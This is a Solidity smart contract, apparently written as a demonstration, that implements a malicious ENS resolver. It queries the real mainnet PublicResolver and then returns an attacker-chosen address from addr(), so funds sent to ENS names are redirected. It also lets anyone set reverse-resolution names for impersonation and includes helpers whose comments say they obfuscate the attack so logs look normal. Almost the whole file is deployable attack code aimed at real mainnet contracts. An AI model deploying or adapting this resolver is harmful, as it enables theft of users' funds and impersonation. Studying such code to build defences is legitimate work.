// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/**
 * @title MaliciousResolver
 * @notice A malicious ENS resolver that performs man-in-the-middle attacks
 * @dev This contract demonstrates a critical vulnerability where a malicious resolver
 *      intercepts resolution calls, queries PublicResolver for correct addresses,
 *      but returns malicious addresses to redirect funds.
 * 
 * ATTACK VECTORS:
 * 1. Man-in-the-Middle: Intercepts addr() calls, queries PublicResolver, returns attacker address
 * 2. Reverse Resolution: Returns arbitrary names for reverse resolution
 * 3. Obfuscation: Queries PublicResolver to appear legitimate
 */
interface IENS {
    function resolver(bytes32 node) external view returns (address);
}

interface IPublicResolver {
    function addr(bytes32 node) external view returns (address payable);
    function name(bytes32 node) external view returns (string memory);
    function text(bytes32 node, string calldata key) external view returns (string memory);
}

interface IAddrResolver {
    function addr(bytes32 node) external view returns (address payable);
}

interface INameResolver {
    function name(bytes32 node) external view returns (string memory);
    function setName(bytes32 node, string calldata name) external;
}

contract MaliciousResolver is IAddrResolver, INameResolver {
    IENS public immutable ens;
    IPublicResolver public immutable publicResolver;
    address public immutable attacker;
    
    // Storage for reverse resolution attacks
    mapping(bytes32 => string) public reverseNames;
    
    // Tracking for obfuscation/debugging
    mapping(bytes32 => address) public interceptedAddresses;
    mapping(bytes32 => uint256) public interceptionCount;
    
    event AddressIntercepted(bytes32 indexed node, address correctAddress, address maliciousAddress);
    event ReverseNameSet(bytes32 indexed node, string name);
    
    // Mainnet addresses (immutable for security)
    address private constant MAINNET_ENS = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;
    address private constant MAINNET_PUBLIC_RESOLVER = 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41;
    
    /**
     * @notice Constructor
     * @param _attacker The address to return instead of correct addresses
     * @param _ens Optional ENS registry address (defaults to mainnet: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e)
     * @param _publicResolver Optional PublicResolver address (defaults to mainnet: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41)
     * @dev If _ens or _publicResolver is address(0), uses mainnet addresses
     *      Mainnet ENS: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
     *      Mainnet PublicResolver: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41
     */
    constructor(
        address _attacker,
        address _ens,
        address _publicResolver
    ) {
        require(_attacker != address(0), "Attacker address cannot be zero");
        
        // Use mainnet addresses if not provided
        address ensAddr = _ens != address(0) ? _ens : MAINNET_ENS;
        address resolverAddr = _publicResolver != address(0) ? _publicResolver : MAINNET_PUBLIC_RESOLVER;
        
        ens = IENS(ensAddr);
        publicResolver = IPublicResolver(resolverAddr);
        attacker = _attacker;
    }
    
    /**
     * @notice Man-in-the-Middle Attack: Intercepts addr() calls
     * @dev This is the core attack function:
     *      1. Queries PublicResolver to get the CORRECT address (for obfuscation)
     *      2. Stores the intercepted address (for tracking)
     *      3. Returns MALICIOUS address instead of correct one
     * 
     * @param node The ENS nodehash to resolve
     * @return The malicious address (attacker) instead of the correct address
     */
    function addr(bytes32 node) external view override returns (address payable) {
        // Step 1: Query PublicResolver to get CORRECT address
        // This makes the resolver look legitimate and allows obfuscation
        address correctAddress = address(0);
        try publicResolver.addr(node) returns (address payable addr) {
            correctAddress = addr;
        } catch {
            // If PublicResolver fails or has no address, return attacker
            return payable(attacker);
        }
        
        // Step 2: In a real attack, we would store this for obfuscation
        // (Can't do in view function, but would be done in non-view version)
        // interceptedAddresses[node] = correctAddress;
        // interceptionCount[node]++;
        
        // Step 3: Return MALICIOUS address instead of correct one
        // This is the key attack: user expects correctAddress but gets attacker
        // User sends funds to attacker thinking it's correctAddress
        return payable(attacker);
    }
    
    /**
     * @notice Non-view version that can store intercepted addresses
     * @dev This would be used in a more sophisticated attack where we need to track
     *      intercepted addresses for obfuscation purposes
     */
    function addrWithTracking(bytes32 node) external returns (address payable) {
        address correctAddress = address(0);
        try publicResolver.addr(node) returns (address payable addr) {
            correctAddress = addr;
        } catch {
            return payable(attacker);
        }
        
        // Store intercepted address for obfuscation/tracking
        interceptedAddresses[node] = correctAddress;
        interceptionCount[node]++;
        
        emit AddressIntercepted(node, correctAddress, attacker);
        
        return payable(attacker);
    }
    
    /**
     * @notice Reverse Resolution Attack: Returns arbitrary names
     * @dev When reverse resolution is queried (address → name), this returns
     *      an arbitrary name, potentially for impersonation attacks
     * 
     * @param node The reverse node (address.reverse nodehash)
     * @return An arbitrary name (could be used for impersonation)
     */
    function name(bytes32 node) external view override returns (string memory) {
        // If we've set a custom name, return it
        if (bytes(reverseNames[node]).length > 0) {
            return reverseNames[node];
        }
        
        // Otherwise, try to get the name from PublicResolver and return it
        // This makes it look legitimate, but we could return any name
        try publicResolver.name(node) returns (string memory correctName) {
            // In a real attack, we might return a different name for impersonation
            // For now, return the correct name to appear legitimate
            return correctName;
        } catch {
            // Return empty string if PublicResolver fails
            return "";
        }
    }
    
    /**
     * @notice Set a custom name for reverse resolution (for impersonation attacks)
     * @dev Allows setting arbitrary names for reverse nodes
     * 
     * @param node The reverse node
     * @param _name The name to return (could be "vitalik.eth" for impersonation)
     */
    function setName(bytes32 node, string calldata _name) external override {
        // In a real attack, this would check authorization
        // For demonstration, we allow anyone to set (in production, would be restricted)
        reverseNames[node] = _name;
        emit ReverseNameSet(node, _name);
    }
    
    /**
     * @notice Obfuscation function: Forward to PublicResolver
     * @dev This makes the attack harder to detect by emitting normal events
     * 
     * @param node The node to forward
     */
    function forwardToPublicResolver(bytes32 node) external {
        // Forward to PublicResolver to emit events
        // This obfuscates the attack and makes logs look normal
        try publicResolver.addr(node) returns (address payable) {
            // Events would be emitted here, making it look legitimate
        } catch {}
    }
    
    /**
     * @notice Get intercepted address for a node
     * @dev Useful for tracking what addresses were intercepted
     */
    function getInterceptedAddress(bytes32 node) external view returns (address) {
        return interceptedAddresses[node];
    }
    
    /**
     * @notice Get interception count for a node
     * @dev Useful for tracking how many times a node was intercepted
     */
    function getInterceptionCount(bytes32 node) external view returns (uint256) {
        return interceptionCount[node];
    }
    
    /**
     * @notice ERC165 interface support
     */
    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == 0x01ffc9a7 || // ERC165
               interfaceId == 0x3b3b57de || // IAddrResolver
               interfaceId == 0x691f3431;   // INameResolver
    }
    
    /**
     * @notice Multicall support for compatibility
     * @dev Some resolvers use multicall, so we support it
     */
    function multicallWithNodeCheck(
        bytes32 /* nodehash */,
        bytes[] calldata data
    ) external returns (bytes[] memory) {
        // Return empty results for each data element
        bytes[] memory results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = "";
        }
        return results;
    }
}
